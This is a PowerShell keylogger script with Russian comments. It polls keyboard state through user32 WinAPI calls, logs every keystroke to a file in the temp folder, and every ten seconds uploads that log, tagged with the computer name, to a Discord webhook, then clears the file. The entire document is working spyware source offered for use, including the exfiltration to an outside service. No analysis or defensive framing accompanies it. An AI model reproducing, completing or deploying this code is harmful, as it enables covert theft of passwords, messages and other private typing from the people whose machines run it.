# Конфигурация
$webhookUrl = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
$logFilePath = "$env:TEMP\keylog.txt"
$checkInterval = 10 # секунд

# Функция для отправки логов в Discord
function Send-ToDiscord {
    param (
        [string]$filePath,
        [string]$message
    )
    
    # Проверяем, есть ли что отправлять
    if (Test-Path $filePath -PathType Leaf) {
        $fileContent = Get-Content $filePath -Raw
        
        if (-not [string]::IsNullOrEmpty($fileContent)) {
            # Формируем тело запроса
            $boundary = [System.Guid]::NewGuid().ToString()
            $body = @"
--$boundary
Content-Disposition: form-data; name="content"

$message
--$boundary
Content-Disposition: form-data; name="file"; filename="keylog.txt"
Content-Type: text/plain

$fileContent
--$boundary--
"@

            try {
                # Отправляем запрос
                $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
                
                # Если отправка успешна, очищаем файл
                if ($response) {
                    Clear-Content $filePath
                    return $true
                }
            } catch {
                Write-Output "Ошибка при отправке: $_"
                return $false
            }
        }
    }
    return $false
}

# Функция для перехвата нажатий клавиш
function Start-Keylogger {
    # Импортируем необходимые WinAPI функции
    $signature = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
    
    $API = Add-Type -MemberDefinition $signature -Name 'Win32' -Namespace API -PassThru

    # Создаем файл лога, если его нет
    if (-not (Test-Path $logFilePath)) {
        New-Item -Path $logFilePath -ItemType File -Force | Out-Null
    }

    # Основной цикл
    while ($true) {
        Start-Sleep -Milliseconds 40
        
        # Проверяем все возможные клавиши
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            
            # Если клавиша нажата
            if ($state -eq -32767) {
                $null = [Console]::CapsLock
                
                # Обрабатываем специальные клавиши
                switch ($ascii) {
                    8 { "[BACKSPACE]" | Out-File -FilePath $logFilePath -Append }
                    9 { "[TAB]" | Out-File -FilePath $logFilePath -Append }
                    13 { "[ENTER]" | Out-File -FilePath $logFilePath -Append }
                    27 { "[ESC]" | Out-File -FilePath $logFilePath -Append }
                    32 { " " | Out-File -FilePath $logFilePath -Append }
                    default {
                        $key = [char]$ascii
                        
                        # Проверяем Shift
                        $shiftState = $API::GetAsyncKeyState(16)
                        $capsLock = [Console]::CapsLock
                        
                        if (($shiftState -eq -32767) -xor $capsLock) {
                            if ($ascii -ge 65 -and $ascii -le 90) {
                                $key = [char]$ascii
                            } elseif ($ascii -ge 97 -and $ascii -le 122) {
                                $key = [char]($ascii - 32)
                            }
                        }
                        
                        # Добавляем символ в лог
                        $key | Out-File -FilePath $logFilePath -Append
                    }
                }
            }
        }
    }
}

# Запускаем проверку вебхука (тестовая отправка)
$testResult = Send-ToDiscord -filePath $logFilePath -message "Keylogger запущен на $env:COMPUTERNAME"
if (-not $testResult) {
    # Если тестовая отправка не удалась, завершаем скрипт
    exit
}

# Запускаем keylogger в отдельном потоке
$keyloggerJob = Start-Job -ScriptBlock ${function:Start-Keylogger}

# Основной цикл для отправки логов
while ($true) {
    Start-Sleep -Seconds $checkInterval
    $sendResult = Send-ToDiscord -filePath $logFilePath -message "Логи с $env:COMPUTERNAME"
    
    if (-not $sendResult) {
        # Если отправка не удалась, ждем дольше перед следующей попыткой
        Start-Sleep -Seconds 30
    }
}
